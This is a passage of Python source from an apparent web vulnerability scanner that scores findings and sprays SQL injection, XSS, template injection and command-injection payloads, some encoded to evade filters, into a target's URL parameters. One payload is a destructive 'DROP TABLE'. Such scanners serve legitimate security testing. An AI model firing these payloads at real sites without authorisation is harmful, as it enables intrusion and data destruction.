class AISecurityAnalyzer:
    VULN_PATTERNS = {
        "injection": {
            "keywords": ["sqli", "xss", "ssti", "injection", "command", "ldap", "nosql"],
            "base_risk": 8.5, "exploitability": "high",
        },
        "authentication": {
            "keywords": ["auth", "jwt", "session", "login", "credential", "password", "oauth"],
            "base_risk": 9.0, "exploitability": "high",
        },
        "information_disclosure": {
            "keywords": ["disclosure", "exposed", "leak", "sensitive", "backup", "debug", "env"],
            "base_risk": 6.0, "exploitability": "medium",
        },
        "misconfiguration": {
            "keywords": ["cors", "header", "csp", "clickjack", "tls", "ssl", "http"],
            "base_risk": 5.0, "exploitability": "low",
        },
        "business_logic": {
            "keywords": ["business", "logic", "workflow", "race", "idor", "tamper", "price"],
            "base_risk": 7.5, "exploitability": "medium",
        },
        "cryptographic": {
            "keywords": ["crypto", "cipher", "weak", "hash", "encrypt", "tls", "certificate"],
            "base_risk": 7.0, "exploitability": "medium",
        },
    }

    EXPLOIT_DIFFICULTY = {
        "CRITICAL": {"score": 9.5, "difficulty": "trivial", "automation": "fully automatable"},
        "HIGH":     {"score": 7.5, "difficulty": "moderate", "automation": "semi-automatable"},
        "MEDIUM":   {"score": 5.0, "difficulty": "complex", "automation": "manual effort required"},
        "LOW":      {"score": 2.5, "difficulty": "theoretical", "automation": "theoretical"},
        "INFO":     {"score": 0.0, "difficulty": "informational", "automation": "n/a"},
    }

    def analyze_findings(self, findings: list, target: str) -> list:
        for f in findings:
            analysis = self._classify_vulnerability(f)
            f.tags = list(set(f.tags + [
                f"ai:{analysis['category']}",
                f"risk:{analysis['risk_level']}",
                f"exploit:{analysis['exploitability']}",
            ]))
            if analysis["risk_score"] > 8.0 and f.severity not in ("CRITICAL",):
                f.description += f" [AI Risk Score: {analysis['risk_score']}/10]"
            impact = self._assess_business_impact(f, target)
            if impact["level"] == "critical":
                f.tags.append("business-critical")
                if f.severity == "HIGH":
                    f.severity = "CRITICAL"
                    f.confidence = min(100.0, f.confidence + 10)
        findings = self._detect_attack_surfaces(findings, target)
        return findings

    def _classify_vulnerability(self, finding: Finding) -> dict:
        text = f"{finding.title} {finding.description} {finding.plugin} {' '.join(finding.tags)}".lower()
        best_cat = "unknown"
        best_score = 0
        for cat, info in self.VULN_PATTERNS.items():
            score = sum(1 for kw in info["keywords"] if kw in text)
            if score > best_score:
                best_score = score
                best_cat = cat
        cat_info = self.VULN_PATTERNS.get(best_cat, {"base_risk": 5.0, "exploitability": "medium"})
        sev_info = self.EXPLOIT_DIFFICULTY.get(finding.severity, self.EXPLOIT_DIFFICULTY["MEDIUM"])
        risk_score = (cat_info["base_risk"] * 0.4 + sev_info["score"] * 0.4 + (finding.confidence / 10) * 0.2)
        risk_level = "critical" if risk_score >= 8 else "high" if risk_score >= 6 else "medium" if risk_score >= 4 else "low"
        return {
            "category": best_cat,
            "risk_score": round(risk_score, 1),
            "risk_level": risk_level,
            "exploitability": cat_info["exploitability"],
            "difficulty": sev_info["difficulty"],
        }

    def _assess_business_impact(self, finding: Finding, target: str) -> dict:
        text = f"{finding.title} {finding.description}".lower()
        critical_indicators = [
            "rce", "remote code", "data breach", "credential", "takeover",
            "privilege escalation", "admin", "database dump", "exfiltration",
        ]
        high_indicators = [
            "session hijack", "authentication bypass", "injection confirmed",
            "ssrf", "file upload", "command execution",
        ]
        crit_matches = sum(1 for ind in critical_indicators if ind in text)
        high_matches = sum(1 for ind in high_indicators if ind in text)
        if crit_matches >= 2 or (crit_matches >= 1 and finding.severity == "CRITICAL"):
            return {"level": "critical", "impact_score": 9.5}
        elif high_matches >= 2 or crit_matches >= 1:
            return {"level": "high", "impact_score": 7.5}
        elif high_matches >= 1:
            return {"level": "medium", "impact_score": 5.0}
        return {"level": "low", "impact_score": 2.5}

    def _detect_attack_surfaces(self, findings: list, target: str) -> list:
        urls = set(f.url for f in findings if f.url)
        params = set(f.param for f in findings if f.param)
        if len(urls) >= 5:
            findings.append(Finding(
                plugin="AISecurityAnalyzer",
                title=f"Large Attack Surface: {len(urls)} vulnerable endpoints",
                severity="HIGH",
                description=f"AI analysis identified {len(urls)} unique vulnerable endpoints across {len(params)} parameters",
                confidence=85.0, url=target,
                tags=["ai-analysis", "attack-surface"],
            ))
        return findings


# ════════════════════════════════════════════════════════════════════════
#  MODULE 5 — SMART PAYLOAD GENERATOR
#  Context-aware · Mutation-based · Encoding chains · WAF bypass payloads
# ════════════════════════════════════════════════════════════════════════

class SmartPayloadGenerator:
    SQLI_TEMPLATES = [
        "' OR {val}={val}--", "' UNION SELECT {cols}--", "'; WAITFOR DELAY '0:0:{delay}'--",
        "1' AND (SELECT {func} FROM {table})>{val}--",
        "' OR 1=1#", "admin'--", "1; DROP TABLE--", "' AND SLEEP({delay})#",
        "') OR ('1'='1", "' HAVING 1=1--", "' GROUP BY 1--",
    ]
    XSS_TEMPLATES = [
        '<script>{code}</script>', '<img src=x onerror="{code}">',
        '<svg/onload="{code}">', '"><script>{code}</script>',
        "'-alert({val})-'", 'javascript:{code}', '<details open ontoggle="{code}">',
        '<body onload="{code}">', '<marquee onstart="{code}">',
        '<input onfocus="{code}" autofocus>', '<iframe src="javascript:{code}">',
    ]
    SSTI_TEMPLATES = [
        "{{{{7*7}}}}", "${{7*7}}", "#{{{7*7}}}", "<%= 7*7 %>",
        "{{{{config}}}}", "{{{{self.__class__}}}}", "${{{T(java.lang.Runtime)}}}", "{{{{request}}}}",
    ]
    CMD_TEMPLATES = [
        ";{cmd}", "|{cmd}", "`{cmd}`", "$({cmd})",
        "&&{cmd}", "||{cmd}", "\n{cmd}", "%0a{cmd}",
    ]
    ENCODING_CHAINS = [
        lambda p: quote(p),
        lambda p: quote(quote(p)),
        lambda p: base64.b64encode(p.encode()).decode(),
        lambda p: "".join(f"%{ord(c):02x}" for c in p),
        lambda p: p.replace(" ", "/**/"),
        lambda p: "".join(f"&#x{ord(c):x};" for c in p),
        lambda p: "".join(f"\\u{ord(c):04x}" for c in p),
        lambda p: p.replace("'", "\\'").replace('"', '\\"'),
    ]

    def __init__(self):
        self._hit_cache = defaultdict(int)

    async def scan(self, client, target: str) -> list:
        results = []
        parsed = urlparse(target)
        params = parse_qs(parsed.query)
        if not params:
            params = {"q": ["test"], "id": ["1"], "search": ["a"]}
        for param in list(params.keys())[:5]:
            for category in ["sqli", "xss", "ssti", "cmd"]:
                payloads = self._generate_smart_payloads(category, context="param")
                for payload in payloads[:8]:
                    try:
                        test_url = self._inject_param(target, param, payload)
                        resp = await client.request("GET", test_url)
                        if resp:
                            body = resp.text if hasattr(resp, "text") else str(resp)
                            status = resp.status if hasattr(resp, "status") else 0
                            finding = self._analyze_response(body, status, payload, category, test_url, param)
                            if finding:
                                results.append(finding)
                                self._hit_cache[category] += 1
                                break
                    except Exception:
                        continue
        return results

    def _generate_smart_payloads(self, category: str, context: str = "param") -> list:
        templates = {
            "sqli": self.SQLI_TEMPLATES,
            "xss": self.XSS_TEMPLATES,
            "ssti": self.SSTI_TEMPLATES,
            "cmd": self.CMD_TEMPLATES,
        }.get(category, [])
        payloads = []
        for tmpl in templates:
            try:
                payload = tmpl.format(
                    val="1", cols="NULL,NULL,NULL", delay="5",
                    func="version()", table="users", code="alert(1)", cmd="id"
                )
            except (KeyError, IndexError):
                payload = tmpl
            payloads.append(payload)
            for encoder in random.sample(self.ENCODING_CHAINS, min(3, len(self.ENCODING_CHAINS))):
                try:
                    payloads.append(encoder(payload))
                except Exception as _silenced_exc:
                    log("DEBUG", f"[suppressed] {_silenced_exc}")
        random.shuffle(payloads)
        return payloads

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _analyze_response(self, body: str, status: int, payload: str,
                          category: str, url: str, param: str):
        indicators = {
            "sqli": [r"(?i)SQL\s*syntax", r"(?i)ORA-\d{4}", r"(?i)mysql_", r"(?i)unclosed.*quotation"],
            "xss": [r"<script>alert\(1\)</script>", r"onerror=", r"onload="],
            "ssti": [r"\b49\b", r"config", r"__class__"],
            "cmd": [r"uid=\d+", r"root:", r"(?i)volume\s+serial"],
        }
        for pattern in indicators.get(category, []):
            if re.search(pattern, body):
                sev = "CRITICAL" if category in ("sqli", "cmd") else "HIGH"
                return Finding(
                    plugin="SmartPayloadGenerator",
                    title=f"Smart {category.upper()} Detection via Generated Payload",
                    severity=sev,
                    description=f"Smart payload generator detected {category} vulnerability in parameter '{param}'",
                    confidence=85.0, url=url, param=param, payload=payload,
                    evidence=f"Pattern matched: {pattern}",
                    tags=["smart-payload", category],
                )
        return None


